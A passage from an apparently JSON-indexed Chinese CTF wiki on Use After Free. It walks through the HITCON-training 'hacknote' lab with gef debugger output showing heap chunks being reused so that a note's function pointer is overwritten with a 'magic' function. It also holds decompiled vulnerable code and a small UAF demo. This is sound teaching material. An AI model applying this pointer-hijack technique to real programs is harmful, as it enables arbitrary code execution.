\n0x00\n\n\nFastbins\n[\nidx\n=\n5\n,\n \nsize\n=\n0x1c\n]\n \n0x00\n\n\nFastbins\n[\nidx\n=\n6\n,\n \nsize\n=\n0x20\n]\n \n0x00\n\n\n\n\n\n\u5f53\u6211\u4eec\u5c06note1\u4e5f\u5168\u90e8\u5220\u9664\u5b8c\u6bd5\u540e\uff0c\u518d\u6b21\u89c2\u770bbins\u3002\u53ef\u4ee5\u770b\u51fa\uff0c\u540e\u5220\u9664\u7684chunk\u5757\u786e\u5b9e\u5904\u4e8e\u8868\u5934\u3002\n\n\ngef\n\u27a4\n  \nheap\n \nbins\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nFastbins\n \nfor\n \narena\n \n0xf7fac780\n \n]\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\nFastbins\n[\nidx\n=\n0\n,\n \nsize\n=\n0x8\n]\n  \n\u2190\n  \nUsedChunk\n(\naddr\n=\n0x804b040\n,\n \nsize\n=\n0x10\n)\n  \n\u2190\n  \nUsedChunk\n(\naddr\n=\n0x804b008\n,\n \nsize\n=\n0x10\n)\n \n\nFastbins\n[\nidx\n=\n1\n,\n \nsize\n=\n0xc\n]\n \n0x00\n\n\nFastbins\n[\nidx\n=\n2\n,\n \nsize\n=\n0x10\n]\n \n0x00\n\n\nFastbins\n[\nidx\n=\n3\n,\n \nsize\n=\n0x14\n]\n  \n\u2190\n  \nUsedChunk\n(\naddr\n=\n0x804b050\n,\n \nsize\n=\n0x28\n)\n  \n\u2190\n  \nUsedChunk\n(\naddr\n=\n0x804b018\n,\n \nsize\n=\n0x28\n)\n \n\nFastbins\n[\nidx\n=\n4\n,\n \nsize\n=\n0x18\n]\n \n0x00\n\n\nFastbins\n[\nidx\n=\n5\n,\n \nsize\n=\n0x1c\n]\n \n0x00\n\n\nFastbins\n[\nidx\n=\n6\n,\n \nsize\n=\n0x20\n]\n \n0x00\n\n\n\n\n\n\u90a3\u4e48\uff0c\u6b64\u65f6\u5373\u5c06\u8981\u7533\u8bf7note2\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u4e0bnote2\u90fd\u7533\u8bf7\u5230\u4e86\u4ec0\u4e48\u5185\u5b58\u5757\uff0c\u5982\u4e0b\n\n\n\u7533\u8bf7note2\u5bf9\u5e94\u7684\u5185\u5b58\u5757\u4e3a0x804b040\uff0c\u5176\u5b9e\u5c31\u662fnote1\u5bf9\u5e94\u7684\u5185\u5b58\u5730\u5740\u3002\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b040\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b040\n\n\n0\nx080486cf\n \nin\n \nadd_note\n \n()\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nregisters\n \n]\n\u2500\u2500\u2500\u2500\n\n\n$eax\n   \n:\n \n0x0804b040\n  \n\u2192\n  \n0x0804b000\n  \n\u2192\n  \n0x00000000\n\n\n$ebx\n   \n:\n \n0x00000000\n\n\n$ecx\n   \n:\n \n0xf7fac780\n  \n\u2192\n  \n0x00000000\n\n\n$edx\n   \n:\n \n0x0804b040\n  \n\u2192\n  \n0x0804b000\n  \n\u2192\n  \n0x00000000\n\n\n$esp\n   \n:\n \n0xffffcf10\n  \n\u2192\n  \n0x00000008\n\n\n$ebp\n   \n:\n \n0xffffcf48\n  \n\u2192\n  \n0xffffcf68\n  \n\u2192\n  \n0x00000000\n\n\n$esi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$edi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$eip\n   \n:\n \n0x080486cf\n  \n\u2192\n  \nadd_note\n+\n89\n \nadd\n \nesp\n,\n \n0x10\n\n\n$cs\n    \n:\n \n0x00000023\n\n\n$ss\n    \n:\n \n0x0000002b\n\n\n$ds\n    \n:\n \n0x0000002b\n\n\n$es\n    \n:\n \n0x0000002b\n\n\n$fs\n    \n:\n \n0x00000000\n\n\n$gs\n    \n:\n \n0x00000063\n\n\n$eflags:\n \n[\ncarry\n \nPARITY\n \nadjust\n \nZERO\n \nsign\n \ntrap\n \nINTERRUPT\n \ndirection\n \noverflow\n \nresume\n \nvirtualx86\n \nidentification\n]\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ncode:\ni386\n \n]\n\u2500\u2500\u2500\u2500\n\n    \n0\nx80486c2\n \nadd_note\n+\n76\n    \nadd\n    \nDWORD\n \nPTR\n \n[\neax\n],\n \neax\n\n    \n0\nx80486c4\n \nadd_note\n+\n78\n    \nadd\n    \nBYTE\n \nPTR\n \n[\nebx\n+\n0x86a0cec\n],\n \nal\n\n    \n0\nx80486ca\n \nadd_note\n+\n84\n    \ncall\n   \n0x80484e0\n \nmalloc@plt\n\n \n\u2192\n  \n0\nx80486cf\n \nadd_note\n+\n89\n    \nadd\n    \nesp\n,\n \n0x10\n\n\n\n\n\n\u7533\u8bf7note2\u7684content\u7684\u5185\u5b58\u5730\u5740\u4e3a0x804b008\uff0c\u5c31\u662fnote0\u5bf9\u5e94\u7684\u5730\u5740\uff0c\u5373\u6b64\u65f6\u6211\u4eec\u5411note2\u7684content\u5199\u5185\u5bb9\uff0c\u5c31\u4f1a\u5c06note0\u7684put\u5b57\u6bb5\u8986\u76d6\u3002\n\n\ngef\n\u27a4\n  \nn\n \n1\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b008\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b008\n\n\n0\nx08048761\n \nin\n \nadd_note\n \n()\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nregisters\n \n]\n\u2500\u2500\u2500\u2500\n\n\n$eax\n   \n:\n \n0x0804b008\n  \n\u2192\n  \n0x00000000\n\n\n$ebx\n   \n:\n \n0x0804b040\n  \n\u2192\n  \n0x0804865b\n  \n\u2192\n  \nprint_note_content\n+\n0\n \npush\n \nebp\n\n\n$ecx\n   \n:\n \n0xf7fac780\n  \n\u2192\n  \n0x00000000\n\n\n$edx\n   \n:\n \n0x0804b008\n  \n\u2192\n  \n0x00000000\n\n\n$esp\n   \n:\n \n0xffffcf10\n  \n\u2192\n  \n0x00000008\n\n\n$ebp\n   \n:\n \n0xffffcf48\n  \n\u2192\n  \n0xffffcf68\n  \n\u2192\n  \n0x00000000\n\n\n$esi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$edi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$eip\n   \n:\n \n0x08048761\n  \n\u2192\n  \nadd_note\n+\n235\n \nadd\n \nesp\n,\n \n0x10\n\n\n$cs\n    \n:\n \n0x00000023\n\n\n$ss\n    \n:\n \n0x0000002b\n\n\n$ds\n    \n:\n \n0x0000002b\n\n\n$es\n    \n:\n \n0x0000002b\n\n\n$fs\n    \n:\n \n0x00000000\n\n\n$gs\n    \n:\n \n0x00000063\n\n\n$eflags:\n \n[\ncarry\n \nPARITY\n \nadjust\n \nZERO\n \nsign\n \ntrap\n \nINTERRUPT\n \ndirection\n \noverflow\n \nresume\n \nvirtualx86\n \nidentification\n]\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ncode:\ni386\n \n]\n\u2500\u2500\u2500\u2500\n\n    \n0\nx8048752\n \nadd_note\n+\n220\n   \nmov\n    \nal\n,\n \nds\n:\n0x458b0804\n\n    \n0\nx8048757\n \nadd_note\n+\n225\n   \ncall\n   \n0x581173df\n\n    \n0\nx804875c\n \nadd_note\n+\n230\n   \ncall\n   \n0x80484e0\n \nmalloc@plt\n\n \n\u2192\n  \n0\nx8048761\n \nadd_note\n+\n235\n   \nadd\n    \nesp\n,\n \n0x10\n\n\n\n\n\n\u6211\u4eec\u6765\u5177\u4f53\u68c0\u9a8c\u4e00\u4e0b\uff0c\u770b\u4e00\u4e0b\u8986\u76d6\u524d\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u770b\u5230\u8be5\u5185\u5b58\u5757\u7684put\u6307\u9488\u5df2\u7ecf\u88ab\u7f6e\u4e3aNULL\u4e86\uff0c\u8fd9\u662f\u7531fastbin\u7684free\u673a\u5236\u51b3\u5b9a\u7684\u3002\n\n\ngef\n\u27a4\n  \nx\n/\n2\nxw\n \n0x804b008\n\n\n0\nx804b008:\n  \n0\nx00000000\n  \n0x0804b018\n\n\n\n\n\n\u8986\u76d6\u540e\uff0c\u5177\u4f53\u7684\u503c\u5982\u4e0b\n\n\ngef\n\u27a4\n  \nx\n/\n2\nxw\n \n0x804b008\n\n\n0\nx804b008:\n  \n0\nx08048986\n  \n0x0804b00a\n\n\ngef\n\u27a4\n  \nx\n/\ni\n \n0x08048986\n\n   \n0\nx8048986\n \nmagic\n:\n   \npush\n   \nebp\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u786e\u5b9e\u5df2\u7ecf\u88ab\u8986\u76d6\u4e3a\u6211\u4eec\u6240\u60f3\u8981\u7684magic\u51fd\u6570\u4e86\u3002\n\n\n\u6700\u540e\u6267\u884c\u7684\u6548\u679c\u5982\u4e0b\n\n\n[\n+\n]\n Starting \nlocal\n process \n./hacknote\n: pid \n35030\n\n\n[\n*\n]\n Switching to interactive mode\nflag\n{\nuse_after_free\n}\n----------------------\n       HackNote       \n----------------------\n \n1\n. Add note          \n \n2\n. Delete note       \n \n3\n. Print note        \n \n4\n. Exit              \n----------------------\n\n\n\n\n\u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u501f\u52a9gef\u7684heap-analysis-helper \u6765\u770b\u4e00\u4e0b\u6574\u4f53\u7684\u5806\u7684\u7533\u8bf7\u4e0e\u91ca\u653e\u7684\u60c5\u51b5\uff0c\u5982\u4e0b\n\n\ngef\n\u27a4\n  \nheap-analysis-helper\n \n\n[*]\n \nThis\n \nfeature\n \nis\n \nunder\n \ndevelopment\n,\n \nexpect\n \nbugs\n \nand\n \nunstability...\n\n\n[+]\n \nTracking\n \nmalloc\n()\n\n\n[+]\n \nTracking\n \nfree\n()\n\n\n[+]\n \nTracking\n \nrealloc\n()\n\n\n[+]\n \nDisabling\n \nhardware\n \nwatchpoints\n \n(\nthis\n \nmay\n \nincrease\n \nthe\n \nlatency\n)\n\n\n[+]\n \nDynamic\n \nbreakpoints\n \ncorrectly\n \nsetup\n,\n \nGEF\n \nwill\n \nbreak\n \nexecution\n \nif\n \na\n \npossible\n \nvulnerabity\n \nis\n \nfound.\n\n\n[*]\n \nNote:\n \nThe\n \nheap\n \nanalysis\n \nslows\n \ndown\n \nnoticeably\n \nthe\n \nexecution.\n \n\ngef\n\u27a4\n  \nc\n\n\nContinuing.\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b008\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b008\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n32\n)\n=\n0x804b018\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b040\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n32\n)\n=\n0x804b050\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nfree\n(\n0x804b018\n)\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nwatching\n \n0x804b018\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nfree\n(\n0x804b008\n)\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nwatching\n \n0x804b008\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nfree\n(\n0x804b050\n)\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nwatching\n \n0x804b050\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nfree\n(\n0x804b040\n)\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nwatching\n \n0x804b040\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b040\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b008\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nCleaning\n \nup\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nRe-enabling\n \nhardware\n \nwatchpoints\n\n\n[\nNew\n \nprocess\n \n36248\n]\n\n\nprocess\n \n36248\n \nis\n \nexecuting\n \nnew\n \nprogram\n:\n \n/\nbin\n/\ndash\n\n\n[\nNew\n \nprocess\n \n36249\n]\n\n\nprocess\n \n36249\n \nis\n \nexecuting\n \nnew\n \nprogram\n:\n \n/\nbin\n/\ncat\n\n\n[\nInferior\n \n3\n \n(\nprocess\n \n36249\n)\n \nexited\n \nnormally\n]\n\n\n\n\n\n\u8fd9\u91cc\u7b2c\u4e00\u4e2a\u8f93\u51fa\u4e86\u4e24\u6b21\uff0c\u5e94\u8be5\u662fgef\u5de5\u5177\u7684\u95ee\u9898\u3002\n\n\n\u9898\u76ee\n\n\n\n\n2016 HCTF fheap", 
            "title": "Use After Free"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#use-after-free", 
            "text": "", 
            "title": "Use After Free"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#_1", 
            "text": "\u7b80\u5355\u7684\u8bf4\uff0cUse After Free \u5c31\u662f\u5176\u5b57\u9762\u6240\u8868\u8fbe\u7684\u610f\u601d\uff0c\u5f53\u4e00\u4e2a\u5185\u5b58\u5757\u88ab\u91ca\u653e\u4e4b\u540e\u518d\u6b21\u88ab\u4f7f\u7528\u3002\u4f46\u662f\u5176\u5b9e\u8fd9\u91cc\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5   \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u88ab\u8bbe\u7f6e\u4e3a NULL \uff0c \u7136\u540e\u518d\u6b21\u4f7f\u7528\uff0c\u81ea\u7136\u7a0b\u5e8f\u4f1a\u5d29\u6e83\u3002  \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3a NULL \uff0c\u7136\u540e\u5728\u5b83\u4e0b\u4e00\u6b21\u88ab\u4f7f\u7528\u4e4b\u524d\uff0c\u6ca1\u6709\u4ee3\u7801\u5bf9\u8fd9\u5757\u5185\u5b58\u5757\u8fdb\u884c\u4fee\u6539\uff0c\u90a3\u4e48 \u7a0b\u5e8f\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u6b63\u5e38\u8fd0\u8f6c \u3002  \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3aNULL\uff0c\u4f46\u662f\u5728\u5b83\u4e0b\u4e00\u6b21\u4f7f\u7528\u4e4b\u524d\uff0c\u6709\u4ee3\u7801\u5bf9\u8fd9\u5757\u5185\u5b58\u8fdb\u884c\u4e86\u4fee\u6539\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u518d\u6b21\u4f7f\u7528\u8fd9\u5757\u5185\u5b58\u65f6\uff0c \u5c31\u5f88\u6709\u53ef\u80fd\u4f1a\u51fa\u73b0\u5947\u602a\u7684\u95ee\u9898 \u3002   \u800c\u6211\u4eec\u4e00\u822c\u6240\u6307\u7684  Use After Free  \u6f0f\u6d1e\u4e3b\u8981\u662f\u540e\u4e24\u79cd\u3002\u6b64\u5916\uff0c \u6211\u4eec\u4e00\u822c\u79f0\u88ab\u91ca\u653e\u540e\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3aNULL\u7684\u5185\u5b58\u6307\u9488\u4e3adangling pointer\u3002  \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50  #include   stdio.h  #include   stdlib.h  typedef   struct   name   { \n   char   * myname ; \n   void   ( * func )( char   * str );  }   NAME ;  void   myprint ( char   * str )   {   printf ( %s \\n ,   str );   }  void   printmyname ()   {   printf ( call print my name \\n );   }  int   main ()   { \n   NAME   * a ; \n   a   =   ( NAME   * ) malloc ( sizeof ( struct   name )); \n   a - func   =   myprint ; \n   a - myname   =   I can also use it ; \n   a - func ( this is my function ); \n   // free without modify \n   free ( a ); \n   a - func ( I can also use it ); \n   // free with modify \n   a - func   =   printmyname ; \n   a - func ( this is my function ); \n   // set NULL \n   a   =   NULL ; \n   printf ( this pogram will crash... \\n ); \n   a - func ( can not be printed... );  }   \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b  \u279c  use_after_free git: ( use_after_free )  \u2717 ./use_after_free                      \nthis is my  function \nI can also use it\ncall print my name\nthis pogram will crash... [ 1 ]      38738  segmentation fault  ( core dumped )   ./use_after_free", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#_2", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5 HITCON-training \u4e2d\u7684 lab 10 hacknote\u4e3a\u4f8b\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#_3", 
            "text": "\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5206\u6790\u4e0b\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u5728\u7a0b\u5e8f\u7684\u5f00\u5934\u6709\u4e2amenu\u51fd\u6570\uff0c\u5176\u4e2d\u6709     puts (  1. Add note           ); \n   puts (  2. Delete note        ); \n   puts (  3. Print note         ); \n   puts (  4. Exit               );   \u6545\u800c\u7a0b\u5e8f\u5e94\u8be5\u4e3b\u8981\u67093\u4e2a\u529f\u80fd\u3002\u4e4b\u540e\u7a0b\u5e8f\u4f1a\u6839\u636e\u7528\u6237\u7684\u8f93\u5165\u6267\u884c\u76f8\u5e94\u7684\u529f\u80fd\u3002", 
            "title": "\u529f\u80fd\u5206\u6790"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#add_note", 
            "text": "\u6839\u636e\u7a0b\u5e8f\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u6700\u591a\u53ef\u4ee5\u6dfb\u52a05\u4e2anote\u3002\u6bcf\u4e2anote\u6709\u4e24\u4e2a\u5b57\u6bb5put\u4e0econtent\uff0c\u5176\u4e2dput\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u51fd\u6570\uff0c\u5176\u51fd\u6570\u4f1a\u8f93\u51fa content \u5177\u4f53\u7684\u5185\u5bb9\u3002  unsigned   int   add_note ()  { \n   note   * v0 ;   // ebx \n   signed   int   i ;   // [esp+Ch] [ebp-1Ch] \n   int   size ;   // [esp+10h] [ebp-18h] \n   char   buf ;   // [esp+14h] [ebp-14h] \n   unsigned   int   v5 ;   // [esp+1Ch] [ebp-Ch] \n\n   v5   =   __readgsdword ( 0x14u ); \n   if   (   count   =   5   ) \n   { \n     for   (   i   =   0 ;   i   =   4 ;   ++ i   ) \n     { \n       if   (   ! notelist [ i ]   ) \n       { \n         notelist [ i ]   =   malloc ( 8u ); \n         if   (   ! notelist [ i ]   ) \n         { \n           puts ( Alloca Error ); \n           exit ( - 1 ); \n         } \n         notelist [ i ] - put   =   print_note_content ; \n         printf ( Note size : ); \n         read ( 0 ,   buf ,   8u ); \n         size   =   atoi ( buf ); \n         v0   =   notelist [ i ]; \n         v0 - content   =   malloc ( size ); \n         if   (   ! notelist [ i ] - content   ) \n         { \n           puts ( Alloca Error ); \n           exit ( - 1 ); \n         } \n         printf ( Content : ); \n         read ( 0 ,   notelist [ i ] - content ,   size ); \n         puts ( Success ! ); \n         ++ count ; \n         return   __readgsdword ( 0x14u )   ^   v5 ; \n       } \n     } \n   } \n   else \n   { \n     puts ( Full ); \n   } \n   return   __readgsdword ( 0x14u )   ^   v5 ;  }", 
            "title": "add_note"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#print_note", 
            "text": "print_note\u5c31\u662f\u7b80\u5355\u7684\u6839\u636e\u7ed9\u5b9a\u7684note\u7684\u7d22\u5f15\u6765\u8f93\u51fa\u5bf9\u5e94\u7d22\u5f15\u7684note\u7684\u5185\u5bb9\u3002  unsigned   int   print_note ()  { \n   int   v1 ;   // [esp+4h] [ebp-14h] \n   char   buf ;   // [esp+8h] [ebp-10h] \n   unsigned   int   v3 ;   // [esp+Ch] [ebp-Ch] \n\n   v3   =   __readgsdword ( 0x14u ); \n   printf ( Index : ); \n   read ( 0 ,   buf ,   4u ); \n   v1   =   atoi ( buf ); \n   if   (   v1     0   ||   v1   =   count   ) \n   { \n     puts ( Out of bound! ); \n     _exit ( 0 ); \n   } \n   if   (   notelist [ v1 ]   ) \n     notelist [ v1 ] - put ( notelist [ v1 ]); \n   return   __readgsdword ( 0x14u )   ^   v3 ;  }", 
            "title": "print_note"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#delete_note", 
            "text": "delete_note \u4f1a\u6839\u636e\u7ed9\u5b9a\u7684\u7d22\u5f15\u6765\u91ca\u653e\u5bf9\u5e94\u7684note\u3002\u4f46\u662f\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728 \u5220\u9664\u7684\u65f6\u5019\uff0c\u53ea\u662f\u5355\u7eaf\u8fdb\u884c\u4e86free\uff0c\u800c\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL\uff0c\u90a3\u4e48\u663e\u7136\uff0c\u8fd9\u91cc\u662f\u5b58\u5728Use After Free\u7684\u60c5\u51b5\u7684\u3002  unsigned   int   del_note ()  { \n   int   v1 ;   // [esp+4h] [ebp-14h] \n   char   buf ;   // [esp+8h] [ebp-10h] \n   unsigned   int   v3 ;   // [esp+Ch] [ebp-Ch] \n\n   v3   =   __readgsdword ( 0x14u ); \n   printf ( Index : ); \n   read ( 0 ,   buf ,   4u ); \n   v1   =   atoi ( buf ); \n   if   (   v1     0   ||   v1   =   count   ) \n   { \n     puts ( Out of bound! ); \n     _exit ( 0 ); \n   } \n   if   (   notelist [ v1 ]   ) \n   { \n     free ( notelist [ v1 ] - content ); \n     free ( notelist [ v1 ]); \n     puts ( Success ); \n   } \n   return   __readgsdword ( 0x14u )   ^   v3 ;  }", 
            "title": "delete_note"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#_4", 
            "text": "\u6211\u4eec\u53ef\u4ee5\u770b\u5230 Use After Free \u7684\u60c5\u51b5\u786e\u5b9e\u53ef\u80fd\u4f1a\u53d1\u751f\uff0c\u90a3\u4e48\u600e\u4e48\u53ef\u4ee5\u8ba9\u5b83\u53d1\u751f\u5e76\u4e14\u8fdb\u884c\u5229\u7528\u5462\uff1f\u9700\u8981\u540c\u65f6\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\u8fd8\u6709\u4e00\u4e2amagic\u51fd\u6570\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u6765\u901a\u8fc7use after free \u6765\u4f7f\u5f97\u8fd9\u4e2a\u7a0b\u5e8f\u6267\u884cmagic\u51fd\u6570\u5462\uff1f \u4e00\u4e2a\u5f88\u76f4\u63a5\u7684\u60f3\u6cd5\u662f\u4fee\u6539note\u7684put\u5b57\u6bb5\u4e3amagic\u51fd\u6570\u7684\u5730\u5740\uff0c\u4ece\u800c\u5b9e\u73b0\u5728\u6267\u884cprint note \u7684\u65f6\u5019\u6267\u884cmagic\u51fd\u6570\u3002  \u90a3\u4e48\u8be5\u600e\u4e48\u6267\u884c\u5462\uff1f                                                                           \u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u6765\u770b\u4e00\u4e0b\u6bcf\u4e00\u4e2anote\u751f\u6210\u7684\u5177\u4f53\u6d41\u7a0b   \u7a0b\u5e8f\u7533\u8bf78\u5b57\u8282\u5185\u5b58\u7528\u6765\u5b58\u653enote\u4e2d\u7684put\u4ee5\u53cacontent\u6307\u9488\u3002  \u7a0b\u5e8f\u6839\u636e\u8f93\u5165\u7684size\u6765\u7533\u8bf7\u6307\u5b9a\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u7136\u540e\u7528\u6765\u5b58\u50a8content\u3002    +-----------------+                       \n   |   put           |                       \n   +-----------------+                       \n   |   content       |       size              \n   +-----------------+------------------- +----------------+\n                                          |     real       |\n                                          |    content     |\n                                          |                |\n                                          +----------------+    